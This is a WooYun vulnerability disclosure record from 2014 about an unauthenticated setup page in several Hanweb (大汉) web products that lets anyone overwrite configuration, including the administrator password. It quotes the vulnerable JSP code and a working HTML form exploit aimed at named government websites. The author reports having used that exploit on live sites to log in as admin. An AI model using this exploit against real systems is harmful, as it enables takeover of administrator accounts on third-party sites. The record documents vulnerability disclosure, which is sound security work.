{"id": 3850, "wybug_id": "wooyun-2014-052747", "wybug_title": "大汉jbook、jget、jvideo、source、jphoto和lm的通用越权漏洞", "wybug_corp": "南京大汉网络有限公司", "wybug_author": "wefgod", "wybug_date": "2014-03-04 15:01", "wybug_open_date": "2014-06-02 15:02", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["越权操作", "认证缺陷", "设计不当导致攻击界面扩大"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-02：\t细节向公众公开  简要描述： jbook=订阅系统（好像是）source=数据源采集系统jget=信息采集系统jvideo=视频系统jphoto=图片系统lm=互动系统大概就是这样。 详细说明：  某个同名文件虽然代码大同小异，但是都产生了同样的越权漏洞，可以重置这几个系统的安装目录相关配置信息。   漏洞证明：  \n<%\tString strRealPath = application.getRealPath(\"\");    //文件路径\tString strDictionary =  application.getRealPath(\"\") +\"/\";\t//构造上传类，传入上传的路径\tCommonUploadFile upload = new CommonUploadFile(strDictionary);\t\t\t\t//上传操作\tboolean b = upload.uploadFile(request);\tString jndi = upload.getFormValue( \"jndi\");\tString product = upload.getFormValue( \"product\");………………\tString servername = upload.getFormValue( \"servername\");\tservername = servername.toLowerCase();\t\t//String jndi = upload.getFormValue( \"jndi\");\tString adminpwd = upload.getFormValue( \"adminpwd\");\tString debug1 = upload.getFormValue( \"debug1\");\tint nDebug = Convert.getStringValueInt( debug1 );\t//String dbtype = upload.getFormValue( request,\"dbtype\");\tString dbtypename = upload.getFormValue( \"dbtypename\");\tdbtypename = dbtypename.toLowerCase();\t\t//获取系统参数\tint b_email = Convert.getStringValueInt(upload.getFormValue(\"openmailbook\"));\tint b_mobile = Convert.getStringValueInt(upload.getFormValue(\"openmobilebook\"));   \tint logsavedate = Convert.getStringValueInt(upload.getFormValue(\"logsavetime\"));      \tString cleartime = Convert.getValue(upload.getFormValue(\"cleartime\")); \tString sysurl = Convert.getValue(upload.getFormValue(\"sysurl\"));\t \t//写sysconfig.xml配置文件\tConfigService configService = new ConfigService();\tSysConfigEntity sysConfig = new SysConfigEntity();\tsysConfig.setOpenmailbook(b_email);\tsysConfig.setOpenmobilebook(b_mobile);\tsysConfig.setLogsavetime(logsavedate);\tsysConfig.setCleartime(cleartime);\tsysConfig.setUrl(sysurl);\tconfigService.saveSysConfig(sysConfig);\t\tString sso = upload.getFormValue( \"sso\");\tString kick = upload.getFormValue(\"kick\");\tString validate = upload.getFormValue(\"validate\");………………\t//写merpserver.ini配置文件\tString iniPath = strRealPath + \"/WEB-INF/ini/merpserver.ini\";\tcom.hanweb.common.util.IniFile ini = new com.hanweb.common.util.IniFile( iniPath );\tini.readIni();\tini.setIniValue(\"WebServer\",servername);\tini.setIniValue(\"AppPath\",jndi);\tini.setIniValue(\"DBType\",dbtypename);\tini.setIniValue(\"AdminPW\",adminpwd);\tini.setIniValue(\"loglevel\",debug1);\tini.setIniValue(\"sso\",sso);\tini.setIniValue(\"kick\",kick);\tini.setIniValue(\"validate\",validate);\tini.writeIni();…………\n关键的几步代码基本如上，几个系统类似（VC或其它的一些系统代码和上面就不同，有比较大差别）\n\n结合里面的相关参数，整理出一个通用的exp，如下（比较简陋）：\n<html><form action=\"http://www.yzwh.gov.cn/jphoto/setup/opr_setting.jsp\" name=\"test\" method=\"post\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"file\" size=\"23\" id=\"file\" /><input type=\"hidden\" name=\"jndi\" value=\"jsp.jsp \" /><input type=\"hidden\" name=\"servername\" value=\"123456\" /><input type=\"hidden\" name=\"debug1\" value=\"123456\" /><input type=\"hidden\" name=\"dbtype\" value=\"123456\" /><input type=\"hidden\" name=\"dbtypename\" value=\"123456\" /><input type=\"hidden\" name=\"ldapV\" value=\"123456\" /><input type=\"hidden\" name=\"dbtypename\" value=\"123456\" /><input type=\"hidden\" name=\"adminpwd\" value=\"123456\" /><input type=\"hidden\" name=\"initapps\" value=\"123456\" /><input type=\"hidden\" name=\"sso\" value=\"123456\" /><input type=\"submit\" value=\"Submit\" /></form></html>\n先用jphoto来做例子。\n\nhttp://www.yzwh.gov.cn/jphoto/setup/ 这是jphoto的setup目录，先用exp提交数据：\n\n提交成功后，提示配置文件修改完成，重启服务。Exp里面是把密码设置为123456的<input type=\"hidden\" name=\"adminpwd\" value=\"123456\" />再回到登录界面，使用admin/123456登录\n\n再用lm做演示http://www.liaocheng.gov.cn/lm/setup/\n\n\n\n\n\n接着最后用source来演示（省级单位……胡乱操作很危险）：http://www.gansu.gov.cn/source/setup/ \n\n\n\n其它系统就不多做演示了，以免影响网站的业务政策运行。但是漏洞都是存在的，希望一次性可以修复掉。   修复方案：     版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-03-05 09:22 厂商回复： 非常感谢您对大汉产品的关注以及对产品安全方面的指正，马上安排修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-05 09:47 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  要突破1000了    \n     2014-03-05 10:10 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @HackBraid 可惜还是打酱油的    \n     2014-03-05 10:13 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  给力！    \n     2014-03-09 18:02 |    \t\t李旭敏 \t\t\t( 普通白帽子  |\t\t\t        Rank:469 漏洞数:71        | ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎...)\t\t \n  @wefgod 请客吃饭~~通用型    \n     2014-03-10 11:50 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @李旭敏 木有QB啊现在    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}